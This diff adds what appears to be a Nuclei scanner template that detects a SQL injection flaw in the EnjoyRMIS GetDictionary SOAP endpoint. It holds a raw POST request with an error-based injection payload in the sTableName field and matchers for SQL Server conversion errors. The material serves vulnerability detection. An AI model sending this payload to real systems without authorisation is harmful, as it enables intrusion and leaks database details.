@@ -1,0 +1,44 @@
+id: enjoyrmis-getdictionary-sqli
+info:
+  name: EnjoyRMIS GetDictionary SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: enjoyrmis
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://tempuri.org/GetDictionary
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:GetDictionary>
+                 <tem:sTableName>1'and 1=@@version--</tem:sTableName>
+              </tem:GetDictionary>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "soap:Server"
+          - "在将"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: status
+        status:
+          - 500
